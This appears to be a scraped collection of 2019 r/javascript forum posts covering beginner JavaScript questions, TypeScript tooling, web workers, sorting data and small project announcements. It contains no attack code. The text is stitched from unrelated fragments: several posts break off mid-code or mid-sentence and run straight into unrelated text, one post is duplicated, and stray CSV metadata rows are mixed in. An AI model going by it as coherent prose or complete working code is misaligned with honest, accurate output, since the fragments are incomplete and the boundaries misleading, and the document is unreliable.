I just had an interview that included a technical test in HTML/XML/JS/SQL. I did well on the test, but there was a JS question that stumped me. It was:

&amp;#x200B;

Given some Fibonacci number (a positive integer in the Fibonacci series), return the position of the number in the Fibonacci series. The series goes 1, 1, 2, 3, 5, 8, 13, 21 . . . so for example 3 should return 3, 21 should return 7 and so on.

I know this is probably best done with an array, but I wrote the following solution on the test. I played around with it in JSFiddle and couldn't get it to work. I have been learning JS for just under a week so there is probably something fundamentally wrong with my logic. I would really appreciate knowing what it is. Thanks in advance!!

&amp;#x200B;

`var num = 21;`

`var a = 1;    //sets one of the starting numbers//`

`var b = 1;    //sets the other starting number//`

`var c = a + b;    //used to find the next term in the sequence//`

`var n = 0;    //this value will be returned as the answer//`

`var temp = '';`

`function FibSeq(num){`

`for (let n = 0; a &lt; num; n++) {   //loops starting at n=0, goes as long as a is less than the given number, increments n by one each iteration`

`temp = a; //stores the value of a`

`a = b; //sets a to the value of b`

Basically if there is even remotely a chance that someone could steal data from my page/app when I use some MIT licensed js libraries, then I can't use them, because we would get sued into the ground.

2404,2019-01-11 14:39:03,17,1,"When I'm trying to learn a new topic, I typically spend some time browsing through relevant questions on Quora about the topic and techniques to better understand it.  Each question on Quora has a ""related questions"" sidebar, and I've found some of the most interesting content on Quora through these links to similar questions.  However, I get mildly frustrated at times, because some of these questions look really interesting but have 0 answers or a handful of low-quality ones.

&amp;#x200B;

To solve this problem for myself, I built a little browser extension that displays a popover above a link to a related question displaying its answer count and the number of votes of the top rated answer.  This way, I only spend my time navigating to questions that have quality content that is valuable to me.  I think it's a little odd that Quora doesn't have any mechanism to indicate this in its current related questions list, because it's no fun to click on a question just to find it doesn't have any answers.

&amp;#x200B;

I wrote it in vanilla javascript, so it was an interesting experience performing DOM manipulations without the convenient abstractions provided by a front-end framework.  I also needed to implement a backend REST endpoint to get the top voted answer, because Selenium was required to scrape all of the answers (since answers are incrementally loaded as the user scrolls).

&amp;#x200B;

The extension is available on the Chrome and Firefox web stores.  If this sounds like something that would be useful to you, I'd encourage you to give it a try and let me know what you think!  I find it useful for myself, so I hope it can improve the Quora experience for others as well.

2405,2019-01-11 21:04:49,4,1,"Hey guys, I recently discovered you can use JSDoc to do IDE type checking and smart intellisense for javascript code in VSCode. I also just recently learned about *.d.ts files and that you can use those instead of `/** @typedef */` to define object literals

I'd like to integrate these features to improve my current project, but keep hitting brick walls

If you npm-install a @types module, VSCode automatically fills everything out. But for some reason it doesn't play as nice with my local declaration files

My current hack is to use @typedef and import the module

    /**
     * @typedef {import('@/ship/TileBase').TileMapBase} TileMapBase
     * @typedef {import('@/ship/systems/ISystem').System} System
     */

But this gets noisy real fast, and you have to do it for *every* type that you use.

I would much prefer if I just had a namespace, something like `iams3b.System` that I can use anywhere

I think in `tsconfig.json` you can set a ""files"" array, which will import the declarations. But, this then means I either have to throw every declaration file into one, or add each file individually every time I create one. And I prefer to have my d.ts file sitting next to the module that makes most use of it (System.d.ts is in the same directory as System.js)

Has anyone tried something similar for smarter intellisense? How'd you decide to go about it, did you get a good system going?

All my google-fu leads me either to problems trying to import d.ts files from other libraries, or using them in Typescript projects... Whereas I'm trying to use my own d.ts files for my own javascript project","Using typescript declaration files with JSDoc, anybody got a good workflow?"

So I've been working on the side of a DOM-related library for javascript called TemmeJS, the idea was inspired by Emmet, and actually went through multiple changes, from parsing a string of instructions (Closer to how Emmet does it) to relying on javascript objects entirely, which opens the door for taking advantage of JSON for data transfer and storage.

&amp;#x200B;

The core functionality of this library isn't simply parsing javascript object into an HTML tree, but it has a very powerful feature that relies on Option inheritance, which I only implemented a portion of of what I had in mind, as I'm still planning to add data binding and easy duplication later on.

&amp;#x200B;

I believe \[the wiki\]([https://github.com/EOussama/temmejs/wiki](https://github.com/EOussama/temmejs/wiki)) has some in-depth documentation about the library as well.

\[This landing page\]([https://eoussama.github.io/temmejs/](https://eoussama.github.io/temmejs/)) is a showcase of Temme as it was entirely generated using the library.

There are some \[examples\]([https://github.com/EOussama/temmejs/tree/master/examples](https://github.com/EOussama/temmejs/tree/master/examples)) in the repository and a few \[unit tests\]([https://github.com/EOussama/temmejs/tree/master/tests](https://github.com/EOussama/temmejs/tree/master/tests)) to complement the project.

You write the backend APIs, URL route endpoints and all frontend javascript within the browser. The framework stores all javascript code in SQL or whatever DB you choose. They've made it extremely difficult to manually pull the code out from the database to work on using something like Pycharm, so reluctantly, you're pretty much forced to do everything in their web IDE with very poor autocompletion. It is almost pointless to write structured classes and modules because it will not help the autocompletion in any way.

&amp;#x200B;

Now this is where the horror show really begins for me. I don't have that much of a beef with being forced to work within the web browser, however in this framework, you can ONLY work on A SINGLE component at any given time. So if you're used to taking advantage of using multiple monitors, they'll do very little to help you. This is because if you create a new API endpoint in the API editor, you will be forced to reload the page on the frontend App editor, if you create a new database table in the model ORM editor, you will also be forced to reload the API editor page. This framework also does not use any states at all throughout the API or frontend editors, so if you reload a single paged web app IDE, all of your work will be wiped and you'll need to reopen the frontend component or whatever again and return to the specific .js file you were working on.

As of right now, I've almost gotten some Python scripts working in PyCharm that'll load all the framework's javascript code into my local dev environment. This way I can finally multitask and work on several documents at once and run and test the frontend on a basic Django app that acts as a simple static HTML file server.

As far as I understand it an array is an Object where the keys are the indexes. A map is an object that has not only keys but also its own indexes. Maps were introduced in es6 and seem superior to objects in pretty much every regard, according to MDN they perform better when you frequently add key/value pairs, they can be iterated over more easily.

so here are the things I don't get:

 \- Should I use Maps instead of Objects? if not, when should I use Maps?

 \- map keys can be any type of objects, even function -&gt; is that something useful outside of very niche cases? 

 \- .map() returns... an array?? Why? Is that just confusing naming?",some clarifications about Maps in js.

2432,2019-01-19 09:11:28,19,1,"Hello everybody.

So I've been working on the side of a DOM-related library for javascript called TemmeJS, the idea was inspired by Emmet, and actually went through multiple changes, from parsing a string of instructions (Closer to how Emmet does it) to relying on javascript objects entirely, which opens the door for taking advantage of JSON for data transfer and storage.

The core functionality of this library isn't simply parsing javascript object into an HTML tree, but it has a very powerful feature that relies on Option inheritance, which I only implemented a portion of of what I had in mind, as I'm still planning to add data binding and easy duplication later on.

For more information, [visit the official repository here](https://github.com/EOussama/temmejs).

I believe [the wiki](https://github.com/EOussama/temmejs/wiki) has some in-depth documentation about the library as well.

[This landing page](https://eoussama.github.io/temmejs/) is a showcase of Temme as it was entirely generated using the library.

There are some [examples](https://github.com/EOussama/temmejs/tree/master/examples) in the repository and a few [unit tests](https://github.com/EOussama/temmejs/tree/master/tests) to complement the project.

I have a simple one page with key fields and free form text field. Key fields are something user would enter. I have two key fields, let say A and B and returned response is a (blob) text field. Key and text field are retrieved from mongodb behind the scene.

My question is, each of these text field can have varying format depending on key combinations. For example A1/B1 returns T1 and has a format of F1/F2/F3. A2/B2 returns T2 and has a format of F4/F5/F6. Now each of these F* format can be date or string or numbers.

In the backend mongo, they are stored as plain text.

My intention/question is, I want to enforce schema through UI so that when F1/F2/F3 is pulled up and rendered on the page, and if F1 is date format, it shows date control on the screen.

This is done to stop allowing user to enter garbage data. Note that date is just an example.


Also, I have lots of these format combinations. Potentially in hundreds so enforcing schema validation on Mongo isn’t an option and something I would like to avoid.

I've been working as a front-end developer for some time now and my biggest issue is how to make my code reusable in the long term. Usually when I code something into a project it ends up being used only in there and I feel like I'm doing something very wrong and programming the same things over and over again.  


I couldn't find one single course on udemy, pluralsight or frontendmasters or anywhere else talking specifically about this.   


The only idea I had so far was to make a git repository with the functions I use the most and have my personal code resource, but I don't know whether it's the most efficient solution. Also, ideally, how should my folder structure look considering it's front-end Vanilla javascript?

From the TL;DR:

1. Caleb Porzio demonstrated [some work he’s been doing](https://twitter.com/calebporzio/status/1085414448846815235) to replicate [Phoenix LiveView](https://dockyard.com/blog/2018/12/12/phoenix-liveview-interactive-real-time-apps-no-need-to-write-javascript) in Laravel.
2. Preprocessing is actually pretty easy to set up. Install a couple libraries, write significantly different (and useful) syntax. No extensions or recompilation.
3. We can already write syntax similar to what you see in ReactJS, in PHP, with a custom compiler. There’s already an implementation for it.
4. By composing the existing implementation’s functionality, we can structure more complex trees of data.
5. These trees of data can include special attributes, which transfer server state to the client and back again.
6. Websockets are the perfect tool for near-constant communication between client and server.
7. Lots of demos; of server code rendering client UI, which calls into server methods, and updates the client with new UI. No client code is required for “normal use”.
8. This community needs to see preprocessing as a tool, not a trojan horse.

Would love some feedback on the idea and/or the implementation. It's obviously not production ready, and there are security things I mention in there which also need to be addressed.","Some light Sunday reading, about the strangest thing I've built in PHP"

For my next project I want to remake an old 2D multiplayer game using HTML, Canvas, and JS. I want to use Typescript on both the client and server side to help minimize mistakes in my code as well as keeping it cleaner. However, after playing around with it, there are just some things that I do not understand and I need someone to help explain to me.

1. How the fuck do you properly compile your project into a **usable, single javascript file** that can be referenced from your web browser and is compatible with older browsers that are not up to date with ES6?

I've read online that you're not supposed to use `--outFile`. Okay, cool. I'm fine with that. But then when I don't use that compiler setting, it puts `require(...)` and `exports` into my final compiled js file. NO. This is not what I want, because browsers don't understand `require()`... Give me a fucking single javascript file that bundles my entire application that I can include from my HTML. Why does there have to be 3,000 fucking different ways to handle javascript modules. Do I have to learn something like webpack for this? I've tried looking at it before, but looking at webpack configuration is like reading Egyptian hieroglyphs and gives me a brain aneurysm. If I don't use `--outFile`, it compiles all my `.ts` files into their own `.js` file. NOT WHAT I WANT!

2. As far as using Typescript on the server side, it doesn't matter if I bundle it into a single `app.js` file or whatever, because node.js can handle modules right?

I have no fucking clue how this whole JS module system is supposed to work, and I don't even know how to start reading about it, because people have come up with a million different ways of doing things to the point where I don't even know what would and what wouldn't work for me.

3. How do I automate everything?

I could have used a proper server and fetch the data in the background, but that would seem like an overkill. So instead I decided to extend the simple http server to reroute certain endpoints.

It's inspired by this [stackoverflow answer](https://stackoverflow.com/a/4412630) and based on the [http.server](https://github.com/python/cpython/blob/3.6/Lib/http/server.py):

            if len(parts) &gt;= 2 and parts[1] in self.proxy_routes:

            self.end_headers()
            self.copyfile(response, self.wfile)

With this extension, you no longer need to leave the page or even download and build bundles yourself to know their footprint.

Comes especially handy, when you consider multiple libraries with the same functionality for your projects.

2467,2019-01-28 15:52:08,13,1,"Hi I'm a bit curious about the efficiency of javascript when it comes to creating extra variables. For a simple example, look at the two snippets of code:

`function SayHi1()`

	`{`

	`let hi = ""hi"";`

	`return hi;`

	`}`

	

`function SayHi2()`

	`{`

	`return ""hi"";`

	`}`

Is `SayHi1` less efficient than `SayHi2`, because `SayHi1` creates an extra variable? In compiled languages, the extra variable wouldn't be a big deal when this code gets turned into machine code, but I'm not sure if that's true in JavaScript. (Specifically, NodeJS is what I'm interested in.)

This is a simple example, but a lot of professional code I see uses the fancy . notation that does a lot of functions/steps in a single line. (Btw if anyone has useful resources for learning those . notation functions that are commonly used, please do link it.)

So are they equally as efficient? Or...?",Efficiency - Don't Create Extra Variables?

Because we need more C# programmers in our community, and I believe that this subreddit is a good start.

The project I'm working on evolves around one main free service: **crowdsourced code reviews**. 

The number of programmers submitting their code for a crowdsourced review is increasing day by day &amp; we're inviting talented and curious C# programmers to join our community of code reviewers. 

Any [talented programmer](https://blog.indorse.io/tagged/interview) can join us and start reviewing code/repos. At this point, to join the community fueling the crowdsourced code reviews, you will have to be assessed by the community itself. This is a [leaderboard](https://indorse.io/validators-leaderboard) we've crated to showcase some of the programmers' activities on Indorse.

In simple words, a programmer submits his code on [Indorse](https://indorse.io/claims/new) (e.g via GitHub repo) and a panel of randomly selected devs from the community will validate the code.

* 1) Seem to be stuck in theory hell. All the courses and books are all Javascript Theory (functions, inheritance, particulars of interpreted langauges). The is very little code. I feel like I should be coding along all this theory. Ideas of basic exercises/beginner samples to start working (implement a calculator, basic stuff)  

* 2) Any suggestions for courses that give beginner ""assignments"" or supplemental work besides the just a ""thoery dump""?  

* 3) Any resources/courses/tutorials that teach the basics of structure/components for building a web page
   * When should I use a TaskRunner (grunt/Gulp)
   * When should I be using a dependency manager (NPM/Bower etc)
   * Does none of that matter and I should be using WebPack  

* 4) At what point of working with JUST javascript (what are some good milestones) to where I should transition to learning with Frameworks (AngularJS/ReactJS/Ember)
   * Say Learn Promises, etc.

I have worked with and built many REST/SOAP APIs (including IIS, OWIN) and web-services but it was all on windows and I am now transition to OSX/Linux environment.

Any help/input would be GREATLY appreciated. Specifically any help with points 3 and 4 would be great.

**I would love to see a good tutorial teaching the structure/management of a webpage using say NPM with Typescript and explaining the components would be great.** 

Again, THANK YOU for any help ahead of time.

So, I work in the cell tower industry, and all our construction drawings have two images of maps on the Title Page:

1. A 'Location Map' (wide area)
2. A 'Vicinity Map' (local area)

Each set of drawings is accompanied by a spreadsheet that pulls info from a master file, including GPS coordinates.

Now, I said all that to say this: I'm trying to save a screenshot of Google Maps automatically based on the GPS coordinates in the spreadsheet for each of these drawing sets (I have a Maps API Key). These screenshots will have a common name and location, then be referenced into our drawings (AutoCAD).

I have looked in lots of places on the webs and from what I've read, it seems like this can be done via html/javascript. This is beyond my knowledge, but I'm willing to learn.

I will also post this in /r/HTML .

2510,2019-02-10 00:40:28,0,1,"Hey Guys.

As the requirements for javascript applications have become increasingly complicated, our code must manage more validation than ever before. This validation can include a complex data structure with related field validation or nested or composed structure.

&amp;#x200B;

Managing all validation in your application can become harder if one field depends on the value of other areas and another one as well depends on others fields, at some point, you no longer track what happens in your code, and you will lose control of your what data is validated.

&amp;#x200B;

Another issue is that almost all code that contains any validation is harder to read and understand quickly, with multiple ""if-else, switch"" statements and nested condition.

&amp;#x200B;

the primary motivation for this project is to create an active community around this problem, with robust solutions and easy implementation to help developers to focus on their application problems and not wasting a lot of time figuring out how to validate.

Among the benefits provided by Continuous Integration (CI), increased team productivity and release frequency are perceived as the main advantages. However, changes that contain defects or that suffer from a poor-quality can lead to build failures that stop a team from delivering. The recent [Report on the State of DevOps](https://cloudplatformonline.com/2018-state-of-devops.html) states: ""When failures occur, it can be difficult to understand what caused the problem"" and previous work found that developers spend on average one hour to fix build breaks!

In our group at the University of Zurich (Switzerland), we are developing new strategies to provide developers with the right assistance to solve build failures faster and more efficiently. To achieve this, we first need to understand the state of practice from real developers and we would like to learn about your personal experience with build failures in this survey.

I would really appreciate if you could find the time to fill out the following [survey](https://docs.google.com/forms/d/e/1FAIpQLSdw-RuDHv7Vlu2A7I4iGm1yC99xE65lk8UmIqxMJNMIxSpGzQ/viewform?usp=sf_link) to help me in my research.

Filling out the survey will take you about 7min. Please note that participating in the questionnaire is completely anonymous, but we will publish the anonymized answers as part of a scientific publication.

From the comments on the last post, it appears that iFrames prevent any kind of interaction due to CORS.

There is a Shopify app that uses the Facebook Messenger API to create a ""send to messenger"" iframe beneath the Add to Cart button. This app sends information about the product to the user's Facebook account if they decide to purchase later. Here is an example in action:

[https://scienceshop21.myshopify.com/collections/frontpage/products/cat-ear-headphones-with-glowing-ears](https://scienceshop21.myshopify.com/collections/frontpage/products/cat-ear-headphones-with-glowing-ears)

In the above example, the checkbox is pre-selected. I have the same app on my store, however, it loads with that box unselected.

I tried a simple script to run on my page that will check that box on a click event. I tested the below javascript snippet. The click event successfully changes the color of the icons on the page, but does not check the box.

    &lt;script src=""https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js""&gt;&lt;/script&gt;
    &lt;script&gt; 
    $(document).ready(function(){

            $(""input#u_0_2"").val('checked');         
            $(""input:checkbox"").attr('checked', true);

- I can't create a new A element and dispatch a click event to it because this new event is not trusted.

Say I have a form that accepts only integers on 5 input fields then a function that calculate the average of those integers called getAverage. If I were to use a jQuery plugin that validates the inputs, how do I ""link"" that to the function that I created? If the form does not pass the validation, keep asking user for valid input and once it passes the validation on submit, but how do I make sure that the getAverage function would initiate and do what it's supposed to do? Right now, my getAverage() won't execute even after passing the jQuery plugin. If no inputs were made, the getAverage() function returns a NaN, which is not something I want to happen.

2535,2019-02-16 03:18:45,4,17,"So, uh, as some of you may recall, at one time [we shared monthly summaries](https://www.reddit.com/r/javascript/search?sort=new&amp;restrict_sr=on&amp;q=flair%3ASubreddit%2BStats) of posting and commenting highlights, they were never wildly popular, but some seemed to really enjoy the format as a discovery tool.

Originally, you could go to /r/subreddit_stats and request a run on your sub, which was nice. But then something happened to the bot serving the requests, and I was required to [run it myself](https://github.com/praw-dev/prawtools). Then, something happened with reddit's API which broke PRAW, and after several months it hadn't been fixed so I abandoned it. I entertained ideas of fixing it myself, but a) my python sucks, b) I've never used the reddit API or PRAW, and c) I had just started a new job. So I shelved it.

This week I was feeling like taking on a new fun project, and started to look into resurrecting the subreddit stats, when I discovered that /r/subreddit_stats is taking requests again! Since we're awkwardly 1/2 through the month, I decided to just run it with no filters and so that's what you see below -- it's view of /r/javascript going back _2956.77 days_.

###I was thinking of starting it back up again on a monthly basis, but only if you guys would enjoy it. So what say you, yea or nay?

I keep googling this, but it feels like unless you work in the industry, it's hard to know which frameworks are up and coming and which are slowly leaving the scene. I've seen Flutter, Electron, I know some Angular and React... Nothing seems to really fit the bill: \*\*what to use to build an app for both macOS and android, in javascript, without having to code the same thing for both platforms too often?\*\*

&amp;#x200B;

\- i mention javascript because this is what I know best, but typescript / java would be totally fine too

\- for some of the things I want to do, a web app would probably do the trick, but I'd still like to see if I can go further with native stuff on both platforms

2538,2019-02-16 19:50:51,1,9,"Hey guys,

&amp;#x200B;

I'm new to javascript land but I've been a backend engineer for some time. Recently I put together a real time telemetry backend and I was put into a position of making it work nicely on the front end. It's websocket based. The initial implementation crashed the browser. I quickly discovered that a queueing mechanism between the websocket and the main UI was necessary. I implemented this by using a web worker who handles and queues all the incoming telemetry datapoint until the main UI asks for them. This is all well and good. 

&amp;#x200B;

That being said, being new to javascript I have a lot of left over questions I need answers to to fully understand and maintain this code for the future. I followed this tutorial: [https://www.fullstackreact.com/articles/introduction-to-web-workers-with-react/](https://www.fullstackreact.com/articles/introduction-to-web-workers-with-react/)  


Immediately - I have 0 clue what this code is doing: [https://github.com/fullstackio/awesome-fullstack-tutorials/blob/master/react/guide-to-web-workers-in-react/react-worker/src/workerSetup.js](https://github.com/fullstackio/awesome-fullstack-tutorials/blob/master/react/guide-to-web-workers-in-react/react-worker/src/workerSetup.js)   


Also I cannot import anything into my equivalent of this file: [https://github.com/fullstackio/awesome-fullstack-tutorials/blob/master/react/guide-to-web-workers-in-react/react-worker/src/worker.js](https://github.com/fullstackio/awesome-fullstack-tutorials/blob/master/react/guide-to-web-workers-in-react/react-worker/src/worker.js)  


I have a common ""Constants.js"" module where I store the strings being used as messages between the web worker and main UI thread. I cannot import this file and use those strings inside my equivalent of the ""worker.js"" file. Is this to be expected?   


Curious if this is the ""right way"" to use a web worker in React also. ","React, Web Workers, and Scopes"

2542,2019-02-18 17:33:02,12,0,"So we are working with some simple browser-based javascript games, but we are recording the user input for replay. The replay is used to validate the data for use in another project. But the precision in javascript is pretty inaccurate, and we want to tighten it up as best as we can. It also needs to work across browser, so the Perfomance API is not a solution.

&amp;#x200B;

So far, we actually switched to recording the coordinates of user actions, rather than deltas, which is a fix, but can also desynch on replay without additional guards. We just want to know how to capture the most accurate timings possible and if we are missing something simple, or something complex.

Suppose I have an array that looks like this: 

    navItems: [
          {
            id: 1,
            itemName: ""name1"",

2544,2019-02-19 22:27:05,1,1,"Hello, I was having hard time sorting this properly and your help is really appreciated.

&amp;#x200B;

I currently have a dataset containing an array of objects in javascript like this. This data is fed into creating d3 heatmap.

""type"" has five categories :a,b,c,d,e.

food a bunch of categories as well. 

&amp;#x200B;

0: {type: ""a"", food: ""pizza"", Year: 2011, Value: 54}

1: {type: ""b"", food: ""pizza"", Year: 2011, Value: 9}

2: {type: ""c"", food: ""pizza"", Year: 2011, Value: 27}

3: {type: ""d"", food: ""pizza"", Year: 2011, Value: 13}

4: {type: ""e"", food: ""pizza"", Year: 2011, Value: 5}

5: {type: ""a"", food: ""chicken"", Year: 2011, Value: 38}

6: {type: ""b"", food: ""chicken"", Year: 2011, Value: 3}

7: {type: ""c"", food: ""chicken"", Year: 2011, Value: 35}

8: {type: ""d"", food: ""chicken"", Year: 2011, Value: 24}

9: {type: ""e"", food: ""chicken"", Year: 2011, Value: 23}

10: {type: ""a"", food: ""burrito"", Year: 2011, Value: 38}

11: {type: ""b"", food: ""burrito"", Year: 2011, Value: 3}

12: {type: ""c"", food: ""burrito"", Year: 2011, Value: 35}

13: {type: ""d"", food: ""burrito"", Year: 2011, Value: 24}

14: {type: ""e"", food: ""burrito"", Year: 2011, Value: 23}

&amp;#x200B;

this needs to be sorted so that it's 

* sorted by type alphabetically: a,b,c,d,e. but then after e, it goes back to a,b,c,d,e and so on.

and then

* food is sorted alphabetically.

&amp;#x200B;

so end result is 

&amp;#x200B;

 {type: ""a"", food: ""burrito"", Year: 2011, Value: 38}

 {type: ""b"", food: ""burrito"", Year: 2011, Value: 3}

 {type: ""c"", food: ""burrito"", Year: 2011, Value: 35}

 {type: ""d"", food: ""burrito"", Year: 2011, Value: 24}

 {type: ""e"", food: ""burrito"", Year: 2011, Value: 23}

 {type: ""a"", food: ""chicken"", Year: 2011, Value: 38}

 {type: ""b"", food: ""chicken"", Year: 2011, Value: 3}

 {type: ""c"", food: ""chicken"", Year: 2011, Value: 35}

 {type: ""d"", food: ""chicken"", Year: 2011, Value: 24}

 {type: ""e"", food: ""chicken"", Year: 2011, Value: 23}

 {type: ""a"", food: ""pizza"", Year: 2011, Value: 54}

 {type: ""b"", food: ""pizza"", Year: 2011, Value: 9}

 {type: ""c"", food: ""pizza"", Year: 2011, Value: 27}

 {type: ""d"", food: ""pizza"", Year: 2011, Value: 13}

 {type: ""e"", food: ""pizza"", Year: 2011, Value: 5}

2546,2019-02-20 04:08:06,4,1,"Hey guys, I've been working on the udactiy javascript intro. Tonight I completed one that was a murder mystery type program using conditional statements:

    /*
     * Programming Quiz: Murder Mystery (3-4)
     */
    
    // change the value of `room` and `suspect` to test your code
    var room = ""dining room"";
    var suspect = ""Mr. Parkes"";
    
    var weapon = """";
    var solved = false;
    
    if (room === ""dining room"" &amp;&amp; suspect === ""Mr. Parkes"") {
        weapon = ""knife"";
        solved = true;
    } else if (room === ""gallery"" &amp;&amp; suspect === ""Ms. Van Cleve"") {
        weapon = ""trophy"";
        solved = true;
    } else if (room === ""billiards room"" &amp;&amp; suspect === ""Mrs. Sparr"") {
        weapon = ""pool stick"";
        solved = true;
    } else (room === ""ballroom"" &amp;&amp; suspect === ""Mr. Kalehoff""); {
        weapon = ""poison"";
        solved = true;
    }
    
    if (solved) {
    	console.log(suspect + "" did it in the "" + room + "" with the "" + weapon + ""!"");
    }
    

This is what I wrote. This one worked great. It returned exactly what I expected. However, when I swapped to test the next one (gallery + Ms. Van Cleve) it would return those two, but it would return the weapon as ""poison"". 

&amp;#x200B;

I did some googling and figured out that I had to change the last else statement to an else if statement. What I don't understand is why. If both the room and suspect match the variable that were input, shouldn't the weapon following that else if automatically be used? Why would it return gallery, ms. van cleve, then go down to select poison as the weapon?

&amp;#x200B;

Thanks in advance :)

&amp;#x200B;

My first passion/fun project (to go along with my usual studies) is a web based rpg. It's basically a single player zork clone with my own characters/story and mechanics. I kind of want it to roll out like chapters in a book where people can go on my website and play through each 'chapter' in the story either using a default character or their unique character. (Unique characters being built up from previous chapters..) 

&amp;#x200B;

I've designed the entire first chapter, at least at a basic level. But RN i only really know Python very well. I know the basics of javascript and html, but python is my main jam. (Using dictionaries, libraries, using OOP, all of that) is easier for me with python right now. I also have some personal incentive to learn python before learning javascript. 

&amp;#x200B;

So my question is, can I make my game in python and have it constantly talk to my javascript later on...? I know you can't run a python game in the web browser, so the beta will have to be a downloaded python file. But can I easily adjust it so that my website written in HTML/CSS/Javascript can talk to the back end python server and learn what to output and just relay inputs to my python game..? a tiny bit of delay shouldn't be bad since it's just a text rpg and only the first chapter. After that I could start writing in Javascript.

First of all i want to say that i am new to javascript and this is  kind of my first code that i want to implement, so the idea is that a  user sees a image of a creature and the player has to guess the name of  that creature and fills this is with a text area (form). For each  correct answer the player get +1 score.

The images are random generated by script from an array

Now the problem is when the player sees the image and types in the  correct name of it. the score does not update, when the player gives the  same answer and the image has been randomly picked and that image ==  answer the score is updated.

example: [Javascript counting problem](https://i.stack.imgur.com/7bUd6.png) so the random pick is as i mentioned the array where it picks a random image. given answer is what the player has given as awnser. so basicly the awnser is checking it only for the later random picks.

    1. Declare a variable named thisDay containing the date August 30, 2018. You will use this date to test your script.
    2. Create a variable named tableHTML that will contain the HTML code of the events table. Add the text of the following HTML code to the initial value of the variable:
    &lt;table id='eventTable'&gt;
    &lt;caption&gt;Upcoming Events&lt;/caption&gt;
    &lt;tr&gt;&lt;th&gt;Date&lt;/th&gt;&lt;th&gt;Event&lt;/th&gt;&lt;th&gt;Price&lt;/th&gt;&lt;/tr&gt;
    3. Lewis only wants the page to list events occurring within 14 days after the current date. Declare a variable named endDate that contains a Date object that is 14 days after the date stored in the thisDay variable. (Hint: Use the new Date() object constructor and insert a time value that is equal to thisDay.getTime() + 14*24*60*60*1000.)
    4. Create a for loop that loops through the length of the eventDates array. Use i as the counter variable.
    5. Within the for loop insert the following commands in a command block:
    a. Declare a variable named eventDate containing a Date object with the date stored in the ith entry in the eventDates array.
    b. Declare a variable named eventDay that stores the text of the eventDate date using the toDateString() method.
    c. Declare a variable named eventTime that stores the text of the eventDate time using the toLocaleTimeString() method.
    d. Insert an if statement that has a conditional expression that tests whether thisDay is ? eventDate and eventDate ? endDate. If so, the event falls within the two-week window that
    Lewis has requested and the script should add the following HTML code text to the value of the tableHTML variable.
    &lt;tr&gt;
    &lt;td&gt;eventDay @ eventTime&lt;/td&gt;
    &lt;td&gt;description&lt;/td&gt;
    &lt;td&gt;price&lt;/td&gt;
    &lt;/tr&gt;
    where eventDay is the value of the eventDay variable, eventTime is the value of the eventTime variable, description is the ith entry in the eventDescriptions array, and price is
    the ith entry in the eventPrices array.
    6. After the for loop, add the text of the HTML code &lt;/table&gt; to the value of the tableHTML variable.
    7. Insert the value of the tableHTML variable into the inner HTML of the page element with the ID eventList.

It's been a few years since i've been in the classrom :-) can someone point me in the right direction?

Here's what I think so far:

It caught my attention when I was doing an internship as a junior web developer(at that time I  had no idea of js and I wanted to learn it so now I bought Eloquent javascript book), a couple months ago I learnt that angularJs was not going to be updated so I thought that meant that it was going to be deprecated at some point and I stopped using it.  


Is there any modern framework whose structure or way of coding is like angularJs? I tried to learn Angular2+ but its complexity of learning was overwhelming for me.

That being said, I've been digging through some old JavaScript code, like 2005 old, and I've found a strange function I can't find documentation on. Below is the code.

function get_level(xp)
{
if(xp &lt; 1024000)
{
return(protect(Math.log(protect(2 * xp / 1000)) / Math.log(2)) + 1);
}
else
{
return(protect(xp / 512000) + 10);
}
In particular it's this protect() function. This bit of code is to be passed a variable containing an experience value and it calculates the player's level. Now I've tried calculating the math by hand but again, math isn't my forte. However my calculations aren't matching up to known variables in xp values and player levels. I have 5 known matches available to me but none are matching. It is very possible it's my own lack of understanding is the problem but the game this code comes from is one of my favorites. I'm trying to reprogram it in c# which I'm much more familiar with and I would love to do it all from scratch without directly lifting and old code.

&amp;#x200B;

I also remember I was running this on Netscape Navigator. I only started professionally working in web development about 3 years ago and use all the modern niceties (wrappers like socketIO around websockets, big ol JS front end frameworks). I can easily piece together how you'd make one of these nowadays. But I'm wondering, how were these chatrooms managed and scaled?

This might not be a question for /r/javascript but I tried searching around and couldn't find anything on Google for old legacy code for chatrooms in the 90s and I figured someone here might have been around then.

2600,2019-03-07 03:07:29,4,0,"Hi, guys. So, First of all, a bit of context. All the code here is from chapter 5 of the book [Eloquent JavaScript](https://eloquentjavascript.net/). It says:

The example data set contains some pieces of information about the 140 scripts defined in Unicode. \[...\] It contains an array of objects, each of which describes a script:

    {   
        name: ""Coptic"",
        ranges: [[994, 1008], [11392, 11508], [11513, 11520]]
    }

It also says: The `ranges` property contains an array of Unicode character ranges, each of which is a two-element array containing a lower bound  and an upper bound. Any character codes within these ranges are assigned  to the script

normal text.

So then, the reduce function is defined as follows in the book:

    function reduce(array, combine, start) {
      let current = start;
      for (let element of array) {
        current = combine(current, element);
      }
      return current;
    }
    
    console.log(reduce([1, 2, 3, 4], (a, b) =&gt; a + b, 0));
    // → 10

So far so good. **What I can't understand is the use of count in the reduce arguments (reduce((count, \[from, to\]))** in the following code. I know that the reduce function needs as a parameter a function that operates on two values (a binary operation). But, like, in my mind the `[from, to]` argument kind of ""matches"" with the arrays elements within the `ranges` property and there's nothing left for `count` to be ""matched"" to. That's what I don't get about it. I'd be glad if someone could clarify it to me.

    function characterCount(script) {
      return script.ranges.reduce((count, [from, to]) =&gt; {
        return count + (to - from);
      }, 0);
    }
    
    console.log(SCRIPTS.reduce((a, b) =&gt; {
      return characterCount(a) &lt; characterCount(b) ? b : a;
    }));

2601,2019-03-07 07:42:36,3,4,"Dear Folks,

I'm working as a Software Engineer in a gaming company and our product team has come up with a new game for android and iOS (casual isometric game like Gardenscapes). Our team has to setup the backend system for the game (yes, it's gonna be a network based game where client-server communication happens via REST calls). We have experience working with legacy systems but have not really built systems required for game play and related, from scratch. In that regard, we are reaching out to the community seeking the necessary guidelines for building such a system by a budding team such as us...

I've collected few requirements that I thought would be required to keep in mind to decide on the backend design and the framework to choose:

* Game is gonna have an isometric gameplay and a meta gameplay. As it is isometric, it would need real time updates. - So we would need to add a websocket I believe (any suggestions would be helpful). And this also means that there are going to be background jobs which need to completed by server at a later point in time.
* Game data (or the market data) for the gameplay is going to be managed at the server by a liveops team. So, we need an admin tool for this. There are of course multiple entities in the game and are definitely going to be related to each other (currently it's mostly one-to-many but going ahead there could be many-to-one and many-to-many as well). So, I was thinking MySQL would the best option.
